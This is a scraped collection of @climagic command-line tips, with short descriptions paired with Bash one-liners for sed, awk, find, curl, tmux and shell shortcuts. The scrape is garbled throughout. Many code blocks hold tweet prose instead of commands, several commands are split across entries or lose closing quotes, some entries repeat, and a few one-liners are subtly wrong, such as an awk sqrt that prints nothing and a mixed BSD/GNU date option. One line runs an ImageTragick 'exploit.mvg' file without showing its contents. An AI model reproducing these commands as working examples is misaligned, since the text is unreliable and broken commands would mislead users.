 printf "10^%d\\n" {0..20} | bc | sed -e :a -e \'s/\\(.*[0-9]\\)\\([0-9]\\{3\\}\\)/\\1,\\2/;ta\'
```

- Unwrap lines that end with a backslash in script.sh

```Bash
 sed -i -e :a -e '/\\\\$/N; s/\\\\\\n//; ta' script.sh
```

- Live dmesg output in human readable format (colors, timing) @climagic

```Bash
 RT @jreybert: dmesg -wH
```

- sed allows you to use other characters to demarcate sections. Same as running: sed s/a/emen/ < dated

```Bash
 sed statement < dated
```

- /!s/$val\\ >/$pid/g' getproc.pl

```Bash
 sed -i -e '/^\\s*
```

- Print config.cfg tab indented to fix a bad console not letting you to see first few columns

```Bash
 sed 's/^/\\t/' config.cfg | less
```

- Find files you haven't accessed so far this year in a directory. Requires atime attributes. Thx @fs111

```Bash
 find . -atime -$(date +%j) -type f
```

- SEDtember and

```Bash
 Get ready for
```

- Find file duplicates in 'Pictures' recursively based on size and mdsum and log them to dupes.txt

```Bash
 fdupes -r Pictures > dupes.txt
```

- extract all unique hex color codes from a CSS file

```Bash
 egrep -oi '#[a-f0-9]{6}' file.css | sort | uniq
```

- Listen to the radio from the command line. Try ./iheart-mplayer $((RANDOM%2000))

```Bash
 https://t.co/pd9i05UD1W
```

- Wait for the friendly Googlebot to pay your site a visit. Brought to you by Carl's Jr

```Bash
 tail -f access_log | awk \'$1~"googlebot"\'
```

- Gen 20 random users/passwords

```Bash
 for i in {1..20} ; do rig|head -1 |tr A-Z a-z;done |while read f l;do echo ${f:0:1}${l}:$(pwgen 12 1);done
```

- Total bytes used by 5+ year old directories in CWD

```Bash
 find . -mtime +$((365*5)) -maxdepth 1 -exec du -sb {} \\; |awk '{s+=$1}END{print s}'
```

- nixDreams https://t.co/3ELuMoZDZR

```Bash

```

- Use -D to create a SOCKS5 tunnel inside your SSH connection. Some programs (like a web browser) can use these

```Bash
 ssh -D 9999 you@remotehost
```

- line}"; done

```Bash
 while read line; do echo "line length is ${
```

- Use a for loop to iterate over a list of items (files, numbers, etc) and run processes accordingly

```Bash
 for i in *.jpg; do identify "$i"; done
```

- Use the && and || logic operators for results based process control

```Bash
 pgrep myscript.pl && echo still running || echo "done" | mail admin
```

- There are helper commands for dealing with compressed files (gz, bz2 and xz). They have a z, bz or xz prefix

```Bash
 zless, zgrep, zcat, zdiff
```

- Last one for today. This indicates to the program that there is no more input. In the shell, this usually closes the shell

```Bash
 <Ctrl-d >
```

- Delete everything from the cursor to the beginning of the line. This can also be used to clear a password attempt and start over

```Bash
 <Ctrl-u >
```

- Delete the previous word on the command line (before the cursor). This is highly useful when reusing old commands

```Bash
 <Ctrl-w >
```

- This is usually equivalent to running 'clear'.  Its usually quicker and doesn't leave the command in your command line history

```Bash
 <Ctrl-l >
```

- Incremental undo of command line edits

```Bash
 <Ctrl-_ >
```

-  >

```Bash
 <Meta-
```

- Insert the last argument from the previous line in the command history into the current line. Different from !$

```Bash
 <Meta-. >
```

- Move your cursor to the end of the line. Faster than holding down right arrow

```Bash
 <Ctrl-e >
```

- Move your cursor to the beginning of the line. Faster than holding down left arrow. In screen, you need to press <Ctrl-a a >

```Bash
 <Ctrl-a >
```

- Reverse search through your command history for 'string'. Press Ctrl-r again to continue searching backwards. ESC when done

```Bash
 <Ctrl-r >string
```

- Quick access to the ASCII character table via the ascii program or the man page if you don't have the program

```Bash
 ascii || man ascii
```

- tmux is a great program that manages multiple terminal sessions and allows you to detach/reattach to the session. Also screen, dvtm

```Bash
 tmux
```

- Use the 'tee' command to save a copy and see the output of a program at the same time

```Bash
 ps auxww | tee output.log
```

- Use -k to search for something in all man pages, like 'sound'

```Bash
 man -k sound
```

- There are several commands inside bash called 'built-ins'. You can access info about them using 'help builtin' or just run 'help

```Bash
 help cd
```

- Print detailed list (-l) of all (-a) files reverse sorted (-r) by last modified time (-t) and with human readable size (-h)

```Bash
 ls -ltrah
```

- You can usually press the tab key in the middle of typing a command name, file name or variable to auto complete it

```Bash
 <Tab >
```

- Takes you back to the previous directory you were in. Good to know if you don't already

```Bash
 cd -
```

- (With no arguments) Takes you back to your home directory

```Bash
 cd
```

- description. The

```Bash
 Just a reminder about the format of climagic tweets: command
```

- Cool visuals you can make in your terminal with your cursor

```Bash
 https://t.co/ammutuorZG
```

- In GNU sort, you can use -V (version sort) to also sort IPv4 addresses numerically according to each class

```Bash
 sort -V ipv4addrs.txt
```

- Use this pipeline pattern of -v -e term1 -e term2 to skip lines in output

```Bash
 | grep -v -e garbage -e unimportant -e donotcare
```

- .Top 20 email From TLDs

```Bash
 egrep -o "from=<[^ >]+\\.[a-z0-9-]{2,} >" /var/log/maillog |awk -F\\. \'{print $NF}\' |sort |uniq -c |sort -rn |head -20
```

- Show stats on messages per day in procmail log

```Bash
 grep ^From procmail.log | cut -d' ' -f3- | date -f - +%Y-%m-%d | uniq -c
```

- Save your whole postfix queue to a file

```Bash
 mailq | awk '/^[0-9A-F]/{print $1}' | tr -d \\* | xargs -n 1 postcat -q > mailq-20160801.txt
```

- Print human readable total size of just the files in the current directory. :)

```Bash
 ls -lh | head -1
```

- Video background

```Bash
 youtube-dl -q -o- _gp51lt9kdA|mplayer -wid $(xwininfo -int -name "Desktop"|grep "Desktop"|awk \'{print $4}\') -cache 5000 -
```

- Search for PATTERN in .c and .h file. Thx @suresh_kanzaria

```Bash
 find . -name \\*.[ch] -exec grep -sl "PATTERN" {} \\;
```

- Find directories that have 33000 or more files in them

```Bash
 find / -type f | sed 's,/[^/]*$,,' |sort |uniq -c | awk '$1 >=33000'
```

- Prepare a list of items (one two three) for SQL list syntax

```Bash
 for i in one two three ; do printf "\'$i\'," ; done | sed \'s/,$//\' ; echo
```

- If you just ran a command like unzip -l https://t.co/dv1SBPbILW to see the contents, you can use ^-l^^ to run again without the -l

```Bash
 ^-l^^
```

- Use elinks to read articles on websites that like to waste CPU energy and your time

```Bash
 elinks https://t.co/qF81UixsjD
```

- Show the number of UNsuccessful requests per day. (Not HTTP code 2XX or 3XX)

```Bash
 awk '$9!~/^[23]/{print $4}' access_log | cut -c1-12 | uniq -c
```

- Calculate how much money I'd have if I had a nickel for every potentially hacked wordpress based site

```Bash
 echo ".05*37652825" | bc
```

- Sorry I missed this one by 2 days. Too damn busy

```Bash
 echo epoch day $(( $( date +%s ) / 86400 ))
```

- Find files and directories under /var/www that are world writable. Exclude symbolic links

```Bash
 find /var/www -perm -o+w -a -not -type l -ls
```

- Where log directory is not world readable, brace expansion helps when a wildcard can't

```Bash
 sudo grep 1.2.3.4 /var/log/httpd/access_log{.2,.1,}
```

- Play a song at the end of long running command to notify you. For @kimadactl

```Bash
 make ; mpg123 hawaii-five-o-theme.mp3
```

- bitcoin prices in USD. Thx @balazssomfalvi

```Bash
 curl -s http://www.coindesk\\.com/price/ |grep bpiUSD |sed \'s/<\\/\\?[^ >]\\+ >//g\' |tr -d " \\t\\r
```

- French Flag

```Bash
 t=$(($(tput cols)/3));for FR in $(seq $(tput lines));do printf "\\e[44m%${t}s\\e[47m%${t}s\\e[41m%${t}s\\e[0m\\n";done
```

- Show the HTTP response code for a URL. Catch it while you can!

```Bash
 curl -sI https://www.nianticlabs\\.com/privacy/pokemongo/en/ | head -1
```

- Show new pingers. -l makes tcpdump linebuffered

```Bash
 sudo tcpdump -l icmp[icmptype]=icmp-echo | awk '{if (!arr[$3]){print $3;arr[$3]++}}'
```

- Find primes w/ PCRE. https://t.co/rnfOtbFL33

```Bash
 n=0;while : $((n++));do printf "%0${n}d"|grep -qP "^0?$|^(00+?)\\1+$"||echo $n;done
```

- Scan directly w/ cur date. Merci @dsampaolo

```Bash
 scanimage --format=tiff --mode Color | convert tiff:- ~/Scans/$(date "+%Y-%m-%d_%H:%M:%S").jpg
```

- computrons https://t.co/Ei6XDKiQOS

```Bash
 Just fixed a computer by touching it. I still got the power.
```

- Shipment status

```Bash
 usps_status(){ elinks -dump tools.usps\\.com/go/TrackConfirmAction?qtc_tLabels1=$1 |sed -n '/Status of Item/{n;p;q}'; }
```

- Generic pipeline template. Just add args

```Bash
 grep | awk | sed | grep | grep -v | while read data ; do something to data ; done | tee output
```

- Just in case you didn't get enough fireworks already. Req. rss-glx screensavers

```Bash
 /usr/lib/xscreensaver/skyrocket --maxrockets 100
```

- Get the absolute value of the 4th column of numbers using the square root of the square trick

```Bash
 awk -F, '{sqrt($4^2)}' data.csv
```

- vote4cli https://t.co/BBk8Ya9QIR

```Bash
 awk/sed 201[0-9] Together We Can Change Anything" bumper sticker now available at https://t.co/FP7f4LUULT
```

- Print the number and column name to help write awk expressions

```Bash
 head -1 data.csv | tr , $'\\n' | nl
```

- Prefix lines with timestamp. Thx @amenthes_de

```Bash
 stdbuf -i0 -o0 ping 192.168.42.1 | while read l; do echo "[$(date \'+%H:%M:%S\')] $l"; done
```

- Use gcalcli to access your Google calendar. https://t.co/upzunxymAQ but its already available in some distros

```Bash
 gcalcli
```

- In X, use xmodmap to turn your Caps Lock into an Escape key

```Bash
 xmodmap -e "remove Lock = Caps_Lock" -e "keycode 66 = Escape
```

- Happy Tau (\xcf\x84) day!

```Bash
 echo "scale=1000;4*a(1)*2" | BC_LINE_LENGTH=1004 bc -l | cut -c1-629
```

- Check the last modified date of a file on a web server

```Bash
 curl -I http://langs.eserver\\.org/latin-terms.txt | grep Last-Modified
```

- Will show you the top power consuming processes on your Linux laptop

```Bash
 powertop
```

- infosec

```Bash
 I just had a bunch of teenagers run 'ping localhost' in front of a news reporter. They're hackers now!
```

- Print out line 107056 of your input file that your program is choking on for invalid input

```Bash
 sed -n '107056p' WigleWifi_20140929191654.kml
```

- Sigh.. What is happening to our beloved Internet? (also run 'whois level3\\.sucks')

```Bash
 dig RandomDomainNameThatDoesNotExistLLC\\.com @4.2.2.2
```

- Print lines not matching (-v) any extended regular expressions (-E) in expressions.conf (-f)

```Bash
 grep -E -v -f expressions.conf file.txt
```

- Print lines from file where GPS coords are in range

```Bash
 awk -F, '((37.19 < $7 && $7 < 37.23) && (-115.81 < $8 && $8 < -115.73))' gpsdata.csv
```

- Convert values from x=year,y=month table to linear CSV

```Bash
 awk \'{for (i=2;i<=13;i++) {printf "%d-%02d,%d\\n",$1,i-1,$i}}\' data-table.txt
```

- Use a sleep and the -u option with scrot to capture a mouseover screenshot

```Bash
 sleep 5; scrot -u Phishing-email-example-with-mouseover.png
```

- Force a timezone for the date by setting the TZ variable. In this case, get UTC time

```Bash
 TZ=UTC date
```

- Replace the second occurrence of a regex match. Thx @slmagus

```Bash
 echo "fuzzbuzz" | sed -e "s/u/i/2
```

- I just ran this vim expression to lower notes in an Arduino sketch 2 octaves

```Bash
 %s/\\(NOTE_[A-Z]\\+\\)\\([0-9]\\)/\\=submatch(1).(submatch(2)-2)/g
```

- Discover the Super Cow Powers of aptitude

```Bash
 o="-vvvvvv";for i in 0 {2..7}; do c="aptitude ${o:0:$i} moo";echo "$ $c"; $c; done
```

- % US pop. murdered 1960-2014

```Bash
 elinks -dump bit\\.ly/qutWZK|tr -d ,|sed -e \'/^2014/q\'|awk \'/^[12]/{p=$6/$2*100; printf "%d %0.4f%%\\n",$1,p}\'
```

- Use a multi-character field separator to get field 3 out of a CSV file that uses double quoted fields

```Bash
 awk -F\'","\' \'{print $3}\' data.csv
```

- This sequence will close an OpenSSH session from the client side (same as killing ssh process). [RET] = Return/Enter

```Bash
 [RET]~.
```

- Yes! You can do nested grouping in extended regexes

```Bash
 grep -Ev "((accept|drop|reject)log|ftpd)" /var/log/messages | less
```

- tbt

```Bash
 SSH starts enabling encryption on all remote login sessions." Oh wait, that was 1995 news.
```

- If you have trouble saying No, get your computer to say it for you, falling back on a working command

```Bash
 (espeak || say || cat)  < No
```

- See the current phase of the moon in your terminal. New feature of wttr.in

```Bash
 curl wttr\\.in/Moon
```

- Take the current tmux pane from split window and break it out into a full sized window

```Bash
 tmux break-pane or <Ctrl-b >:break-pane
```

- Rotate a video taken by a "smart"phone user 90 degrees CW. Or just for fun. Try rotate=2 for CCW

```Bash
 mplayer -vf rotate=1 video.mp4
```

- See what software was used for an image

```Bash
 exiftool <(curl -s apod.nasa\\.gov/apod/image/1605/NGC5078-LRGBhager2048.jpg) |grep Software
```

- Besides skipping aliases, a backslash before command also avoids Programmable Tab Completion

```Bash
 \\vim not-everything-is-a-java-file.class
```

- serverless

```Bash
 In my experience, most devs don't maintain their servers anyways. So what's new?
```

- Quick way to see if your pwd path contains any symlinks in it. If so there would be a difference between the two lines

```Bash
 pwd ; pwd -P
```

- this is a trick you can use to grep the process without catching grep too

```Bash
 @ExaGridDba ps -ef | grep [s]mon
```

- Read compressed logs, process only time lines and filter

```Bash
 zcat 2016-05-23/smtp.*.gz |awk '$1~/^[0-9]{9}/' |grep -v -e 10.1.2.3 -e root@
```

- Calculate 7 years ago in days, accounting for leap years

```Bash
 echo $(( ( $( date +%s ) - $( date -d -v-7y +%s ) ) /86400 ))
```

- Calculate 7 years ago in days, accounting for leap years

```Bash
 echo $(( ( $( date +%s ) - $( date -d "now - 7 years" +%s ) ) /86400 ))
```

- Total bytes of files older than ~7 yr

```Bash
 find . -xdev -type f -mtime +$((365*7)) -print0|xargs -0 du -bsc|awk '/\\ttotal$/{s+=$0}END{print s}'
```

- Ubuntu users, if appstreamcli is running right now, check this URL. 100% CPU bug

```Bash
 pgrep appstreamcli && xdg-open https://t.co/b9W7ktbTRJ
```

- Show what files or filehandles are open in the specified directory

```Bash
 sudo lsof +D /var/lib/apt/lists
```

- DigitalPackRat

```Bash
 @w4rchylde I still have my email going back to 1994.
```

- tbt https://t.co/0QKYxLVs8V

```Bash
 Another X screenshot from 1997.  My god I used X as root? Shameful.
```

- tbt https://t.co/zofEfxvxAr

```Bash
 My "X Window System, Version 11" screenshot from 1999.
```

- Use strace to show the files openssl is opening

```Bash
 strace -e open openssl s_client -crlf -quiet -starttls smtp -connect smtp.example\\.com:25
```

- BTW, if I ran the mail server this was on, I'd run this

```Bash
 grep -lr "^Subject: test " Maildir/{cur,new} |xargs rm -v 2 >&1 |tee delete.log
```

- When running commands in a subshell, you can use job control (Ctrl-C, Ctrl-Z, fg, bg) on the subshell as a whole unit

```Bash
 (cmd1;cmd2;cmd3)
```

- Rename the filesystem label on a USB thumb drive to Backups

```Bash
 sudo mlabel -i /dev/sdg1 -s ::"Backups
```

- Press pause on your Roku. [When your kids lose the remote]

```Bash
 curl -d "" http://YourRokuIP:8060/keypress/Pause
```

- See the last logged in users, but filter out entries for root, reboots and asmith

```Bash
 last -da | grep -vE "^(root|reboot|asmith)
```

- RemoveALetterBreakAConfigFile

```Bash

```

- RemoveALetterSpoilABook https://t.co/qHdt16ZySu

```Bash
 ill Gates: The Rod Ahead
```

- Get a list of debian packages with linux in their name and only list the ones that are fully installed

```Bash
 dpkg -l '*linux*' | grep '^ii'
```

- Pipe the output of the man command into other commands to trim down the "insane amounts of drivel"

```Bash
 man dpkg | sed -n \'/Doctal/,/2000 /p\'
```

- "Tell me about your relationship with your parents."

```Bash
 pstree -a
```

- Start looking for vulnerable code using ImageMagick

```Bash
 find www -name '*.php' -exec egrep -l 'bin/(identify|convert|mogrify|montage)\\b' {} +
```

- I posted this tweet using the @ImageTragick vuln and then fixed this server. Yes, its quite serious. Check it

```Bash
 identify exploit.mvg
```

- I'm disappointed the logo for @ImageTragick vuln was not actually made in ImageMagick

```Bash
 strings logo-medium.png|head
```

- Press enter every time you hear child cough to determine if per min rate is going down

```Bash
 while read -s; do date +%H:%M; done |uniq -c
```

- If you are in a directory that is removed and recreated (such as a symlinked current dir), this will put you in the new directory

```Bash
 cd .
```

- Number of git merges by day of the week. Thx @nicr9_

```Bash
 git log --merges | grep ^Date | awk '{ print $2 }' | sort | uniq -c | sort -n
```

- List the files below the www directory that don't (-L) have PHP code in them

```Bash
 grep -rL '<?php' www
```

- script is a nice program that allows you to record your interactive shell session. Great for logging upgrades

```Bash
 script upgrade.log
```

- Print how many files are inside each directory under the current one

```Bash
 find */ | cut -d/ -f1 | uniq -c
```

- Remove the previous word on the command line (before the cursor). This is highly useful when reusing old commands

```Bash
 <Ctrl-w >
```

- This is usually equivilent to running 'clear'.  Its usually quicker and doesn't leave the command in your command line history

```Bash
 <Ctrl-l >
```

- Incremental undo of command line edits. Ctrl-- works the same and Ctrl-? sometimes works as well, although its not documented

```Bash
 <Ctrl-_ >
```

-  >

```Bash
 <Meta-
```

- Insert the last argument from the previous line in the command history into the current line. Different from !$

```Bash
 <Meta-. >
```

- Move your cursor to the end of the line. Faster than holding down right arrow

```Bash
 <Ctrl-e >
```

- Move your cursor to the beginning of the line. Faster than holding down left arrow. In screen, you need to press <Ctrl-a a >

```Bash
 <Ctrl-a >
```

- Reverse search through your command history for 'string'. Press Ctrl-r again to continue searching backwards. ESC when done

```Bash
 <Ctrl-r >string
```

- Takes you back to the previous directory you were in. Good to know if you don't already

```Bash
 cd -
```

- (With no arguments) Takes you back to your home directory

```Bash
 cd
```

- With GNU sleep, you can use time suffixes (m = minute, h = hour, d = day). Note that some very large values get truncated

```Bash
 sleep 5d
```

- ASCII globe animation

```Bash
 oneworld=$( curl -Ls http://bit\\.ly/globe_vt );while sleep .1;do pv -L4220 -q  < "$oneworld";done
```

- View image metadata without downloading whole 16MB image

```Bash
 curl -sr 0-1024 www.nasa\\.gov/images/content/618486main_earth_full.jpg |strings
```

- When using multiple file arguments with less or vi, you can use :n and :p to go next file (n) and prev file (p) in list

```Bash
 :n and :p
```

- Remove the oldest .pcap file in the /netdumps directory

```Bash
 rm "$( ls -1dt /netdumps/*.pcap | tail -1 )
```

- For those with xscreensaver installed. Press space to draw another one

```Bash
 /usr/lib/xscreensaver/penrose -size 16 -ncolors 64 -delay 1000
```

- Audio prompt. Could also use different notes/melodies for various return codes

```Bash
 PROMPT_COMMAND="play -qn synth sin G3 trim 0 0.1
```

- Change the host header to bypass the DNS

```Bash
 curl -H "Host: https://t.co/BU49d2rfW6" http://example.climagic\\.org/config.php
```

- Alias for running a command as the nobody user. Maybe to reduce privilege or to confirm denial of access

```Bash
 alias nobody='sudo -u nobody'
```

- climagic video: Joining files together using the join command

```Bash
 https://t.co/nDVS07oTdg
```

- Search your history for commands matching ssh and then execute command

```Bash
 history | grep ssh \r!423
```

- (In Linux VM) Used this to bind Mac right command key to Linux VM middle mouse click

```Bash
 xmodmap -e "keycode 134 = Pointer_Button2";xkbset m
```

- Merge two files together based on the first column in each. Print file1.col1:file2.col2

```Bash
 join -o 1.1,2.2 -1 1 -2 1 -t: file1 file2
```

- Remove meetings, really fast. (But make sure they are properly quoted)

```Bash
 rm -rf "${MEETINGS[@]}
```

- This will print only the last line that matches REGEX. Thanks long time listener first time caller @stephensant

```Bash
 sed -ne '/REGEX/h;${x;p}'
```

- Live insert the last word from the previous command in history into current line. Can repeat to go further. Not the same as !$

```Bash
 [Meta-.]
```

- Deletes orphaned docker images. Thx @jvz

```Bash
 for x in $(docker images | awk \'$1 ~ "<none >" {print $3}\'); do docker rmi $x; done
```

- Remove all exif metadata from a photo. Thx @cengizIO

```Bash
 exiftool -all= foo.jpg
```

- Ping home when mic "hears" something

```Bash
 while :;do rec -t raw /dev/null rate 32k silence 1 0.1 2% 1 0.0 2% && ping -c 1 home;sleep 1; done
```

- Major colors

```Bash
 for i in *.jpg;do printf "$i %s\\n" $(convert "$i" -scale 1x1\\! -format \'%[pixel:u]\' info:- ) ;done |tee -a color-indexes.txt
```

- Continually watch processes with names Thx @_radome_

```Bash
 watch -n 0.5 "ps uf -C process1,process2
```

- NPM outdate for projects in dir. Thx @afschr

```Bash
 for d in */; do echo $d; cd $d; npm outdate; cd - > /dev/null; done
```

- Use timeout to only run a command for a set amount of time (1hour)

```Bash
 timeout 1h tcpdump -n -i eth0 -w network.pcap not host 192.168.1.5
```

- Find out what country that IP that just pinged your host is from

```Bash
 geoiplookup 111.75.195.232
```

- Format XMLs. Thx @deepankarb

```Bash
 find -name "*.xml" | while IFS=$\'\\n\' read f ; do xmllint --format "$f" > tmp.xml && mv -v tmp.xml "$f"; done
```

- When Apr01 just won't do, show the (long) format start time for all processes on a Linux system

```Bash
 ps -o pid,lstart,command ax
```

- Well written GUI programs play well with the command line. Multiple args open multiple files

```Bash
 gimp IMG_253{1,4,6..9}.JPG
```

- Use Facebook authentication for SSH and auto "Like" the host too. New ssh options

```Bash
 ssh --like -u fb::Bob_Reach https://t.co/SsgG5tPN0a
```

- Send those new Windows bash users a gift

```Bash
 mkdir fun; touch fun/{R,r}{E,e}{A,a}{D,d}{M,m}{E,e};echo hello  >fun/rEadME;zip -r fun\\.zip fun
```

- Convert MP4 to WAV. Thanks @varpt

```Bash
 for f in *.mp4; do echo "processing $f"; bname=$(basename $f); ffmpeg -i "$f" "$bname.wav"; done
```

- After killing processing using up all your RAM on Linux (Firefox!!), move processes off of swap

```Bash
 sudo bash -c 'swapoff -a && swapon -a'
```

- Show partitions of only physical SCSI/SATA/SCA drives and not other things like device mapper entries

```Bash
 sudo fdisk -l /dev/sd?
```

- n[*]}));play -qn synth pl ${n[$r]} trim 0 1;read -p "[A-G]?" g;[[ "$g" == "${n[r]:0:1}" ]]&&echo y||echo n

```Bash
 n=({A..G}{2..6});r=$((RANDOM%${
```

- Print temperature value from sensor w/ time when temp is over 80

```Bash
 while sleep 30; do curl -s 192.168.0.106 |jq '.temp'|awk '$1 >80'|ts ;done
```

- Output json data from sensor w/ time when temp reaches over 80

```Bash
 while sleep 30; do curl -s 192.168.0.106 |egrep "temp: 8[0-9]" | ts ;done
```

- If you like pasting into STDIN pipeline, this trick can prevent the processing from starting until you press [Ctrl-D]

```Bash
 tac|tac|
```

- Arduino temp sensor to timed logfile and view

```Bash
 tail -f /dev/ttyACM0 |gawk \'{print strftime("%Y-%m-%d %T") " " $0)}\' |tee temperature.log
```

- longnow

```Bash
 Hearing of Andy Grove's passing reminds me, we really are still at the beginning of computing. Imagine 1000 years from now.
```

- Every time you reuse a command from your command history, it saves a tree in the digital world. \xe2\x99\xbb

```Bash
 <Ctrl-r >searchpattern
```

- In vim this will search all lines (%s) for wlan0 and replace all the instances per line (g) with eth3 and confirm (c)

```Bash
 :%s/wlan0/eth3/gc
```

- If you ever want to use a negative offset (from the end) for variable substrings, the space before the - is important

```Bash
 echo ${DISPLAY: -1}
```

- USER}/2}

```Bash
 echo ${USER:0:${
```

- set access/modification times of newfile to those of oldfile

```Bash
 touch -r oldfile newfile
```

- find 4-leaf

```Bash
 t=$((COLUMNS*LINES-COLUMNS));r=$((RANDOM%t));printf "\\e[32m";for i in $(seq $t);do [[ $i == $r ]]&&printf "\xf0\x9f\x8d\x80"||printf "\xe2\x98\x98";done
```

- Long list the files/directories with only 4 characters by using 4 match any single character patterns (?). For @alecedworthy

```Bash
 ls -ld ????
```

- Check a domain to make sure its all the ASCII characters you expect and not Unicode look-a-likes

```Bash
 echo \xef\xbd\x99o\xcf\x85r\xef\xbd\x82\xef\xbd\x81\xef\xbd\x8e\xef\xbd\x8b.com | hexdump -c
```

- A rainbow in your shell

```Bash
 yes "$(seq 231 -1 16)" | while read i; do printf "\\x1b[48;5;${i}m\\n"; sleep .02; done
```

- Show all programs listening TCP/UDP ports. You may want to run this with superuser privileges

```Bash
 lsof -Pan -i tcp -i udp
```

- pi domain owners

```Bash
 for i in $(seq 4 65);do echo -n "${pi:0:$i}.com: ";whois ${pi:2:$((i-2))}.com|grep --col=no "rant Na"||echo;sleep 5;done
```

- Happy Pi Day! Calculate \xcf\x80 to 1000 digits using bc and assign it to pi

```Bash
 pi=$( echo "scale=1000;4*a(1)" | BC_LINE_LENGTH=1004 bc -l )
```

- Req. ImageMagick

```Bash
 convert -size 413x314 xc:tan -fill red -pointsize 200 -gravity center -draw "text 0,0 \'3.14\'" -flop pie.png
```

- Kill all

```Bash
 ps ax -o state -o ppid  | awk \'$1=="Z"{print $2}\' | xargs kill -9
```

- Change URL into a more filesystem friendly form and squeeze the repeated _ chars into one

```Bash
 echo "$URL" | tr -s / _
```

- OpenStack https://t.co/lZHci6jETq

```Bash
 Gotta love it when a speaker hands out CLI cheatsheets. Thanks @rbowen
```

- Generate a random ordered list of 20 numbers. For example to determine order of presentation

```Bash
 seq 20 | shuf
```

- Show just the Documents followed by person@domain

```Bash
 grep -e Document -e person@domain multilinelist.txt |grep -B1 person@domain
```

- Make stats of the top file types in this directory and below

```Bash
 find . -exec file -b --mime-type {} + | sort | uniq -c | sort -nr
```

- How many times did they say cyber? Just select all in your browser copy and paste into this command to find out

```Bash
 grep -io "cyber" | wc -l
```

- in bash, set this option to make sure backgrounded jobs don't get killed when the parent shell exits

```Bash
 shopt -u huponexit
```

- Adjust all rsync processes on the system so that they have lower (idle) IO priority

```Bash
 pgrep rsync | xargs ionice -c3 -p
```

- WP abuse

```Bash
 grep -h "POST /.*wp-login.php" *-access_log |awk \'$1!~/^my.ip.addr$/{print $1}\' |sort|uniq -c|sort -nr |head -50 > wp-abusers.txt
```

- Its a pretty weird day when you find yourself running a command like this to diagnose a problem

```Bash
 tcpdump -i eth0 dst net 127.0.0.0/8
```

- An easy way of selecting the processes owned by someuser

```Bash
 ps wu -U someuser
```

- Drownattack TLD stats

```Bash
 curl -s https://www.drownattack\\.com/top-sites |html2text|awk -F\\. '/^[0-9]+/{print $NF}' |sort|uniq -c|sort -nr
```

- Stump your friends. How many months had only 19 days? Answer: 1 (When we switched to Gregorian. Actual month depends on locale)

```Bash
 cal 9 1752
```

- Show the first and last 5 lines of the file 'log'

```Bash
 (head -5; tail -5) < log
```

- vim add column Data5=N with an inc. number

```Bash
 :let i = 1 | g/|Population=/s/|Population=/\\=printf("|Data5=%d|Population=", i)/ | let i = i+1
```

- Show % reports of CPU statistics for every active task in the server at two second intervals

```Bash
 pidstat 2 5
```

- Lower case all files in a folder

```Bash
 for f in *; do b=$(echo "$f" | tr \'[A-Z]\' \'[a-z]\'); mv "$f" "$b"; done
```

- Make some waves. Req 256-color term

```Bash
 yes "$(seq 19 21; seq 21 -1 18)" |while read i; do printf "\\x1b[48;5;${i}m\\n"; sleep .03; done
```

- counts files in the current path by modification month. Thx @aSheepie

```Bash
 find . -maxdepth 1 -type f -printf '%TY-%Tm\\n' | sort | uniq -c
```

- Print all from 3rd field to end of line. Very useful for log parsing

```Bash
 awk '{ print substr($0, index($0,$3)) }' mail.log
```

- *"Attempt"* to recover an accidentally removed file

```Bash
 fgrep --binary-files=text -C 2000 "string in file" /dev/sda > recovereddata.out
```

- Make less more like more, but still more than more. Percent of file in prompt, etc. Thx @CLK55

```Bash
 export LESS='-sCmqPm--Less--(?eEND:%pb\\%.)'
```

- This environment variable will invoke 'less' with these options when it is used. Like when viewing a man page

```Bash
 export LESS="-S -j10 -i
```

- Terminal based spreadsheet program. Has some degree of vi key support

```Bash
 sc
```

- This is an X automation tool that allows you to script your keyboard and mouse

```Bash
 xdotool
```

- You can actually follow more than one log at once and get new updates on them. Use -q to not print filename header

```Bash
 tail -f *.log
```

- TEXT}

```Bash
 TEXT="measure the length of this text" ; echo ${
```

- In RPM, determine which packages where installed in Nov 2015

```Bash
 rpm -qa --queryformat "%{NAME} %{INSTALLTIME:date}\\n" | grep "Nov 2015
```

- Find and long list mp3 files in Music dir older than a year and larger than 10MB

```Bash
 find music -name '*.mp3' -mtime +365 -a -size +10M -ls
```

- Show photo filenames where no flash was used. Req. Imagemagick

```Bash
 identify -format "%f F:%[EXIF:Flash]\\n" *.jpg | egrep " F:(0|16|24|32)$
```

- Stream mp3 at bitrate speed (128Kbits). WARNING: NSFW "lyrics"

```Bash
 curl -N --limit-rate 16K http://f.climagic\\.org/techsup.mp3 | mpg123 -
```

- Search for names and build a frequency count for each name

```Bash
 egrep -wo "(Donnie|Frank|Roberta|Grandma)" story.txt |sort|uniq -c|sort -r
```

- Show the total space used on all your local disk partitions

```Bash
 df -lP |awk \'{sum += $3} END {printf "%d GiB\\n", sum/2**20}\'
```

- Use the */ trick to get only the directories, then use ${dir%/} to remove the trailing / you get

```Bash
 for dir in */ ; do echo "${dir%/}" ; done
```

- Use perl regex (negative look-behind/look-ahead assertions) to get URLs

```Bash
 grep -P -o \'(?<=href=")http:\\S+(?=")\' *.html
```

- Create a 1280x720 color plasma image. Different each time. Uses ImageMagick

```Bash
 convert -size 1280x720 plasma:green-blue background.png
```

- Write 1MB (1048576) of random numbers to a file

```Bash
 strings /dev/urandom | tr -c -d '0-9' | dd of=randomnumbers.txt bs=1 count=1M
```

- Replace foo with bar only on lines that contain 'bang'. Use in pipeline or with file args. Thanks @Agarri_FR

```Bash
 sed "/bang/ s/foo/bar/
```

- Poor man's video streaming service at video bitrate

```Bash
 Server: nc -l 8762 < video.mpg  Client: nc server 8762 | mplayer -cache 1000 -
```

- After all the host keys and auth, you'll be on server3

```Bash
 ssh -t user1@server1 \'ssh -t user2@server2 "ssh -t user3@server3"\'
```

- rig is this cool little program that generates random identities

```Bash
 rig
```

- Guitar strum. play is from sox pkg

```Bash
 play -n synth pl G2 pl B2 pl D3 pl G3 pl D4 pl G4 delay 0 .05 .1 .15 .2 .25 remix - fade 0 4 .1 norm -1
```

- Climagic video - Aliases vs Functions and where to use $1

```Bash
 https://t.co/5h7TPmrTOs
```

- Play music for 60 minutes and then shutdown. Like sleep on alarm clock

```Bash
 sudo shutdown -h 60 & mpg123 ambientmusic/*.mp3
```

- Using +F option or pressing F in less is similar to `tail -f filename.log` but can use less's features. Thx @gazoombo

```Bash
 less +F filename.log
```

- In vim, when you want to paste in code, its often useful to 'set paste' so that the autoindent/syntax doesn't interfere

```Bash
 :set paste
```

- If you set your production server's time to this date, you will get fired

```Bash
 date -s 1970-01-01
```

- Nice little demo of the potential of UTF-8 in plain text files

```Bash
 vim 'https://t.co/I695o2mTh2'
```

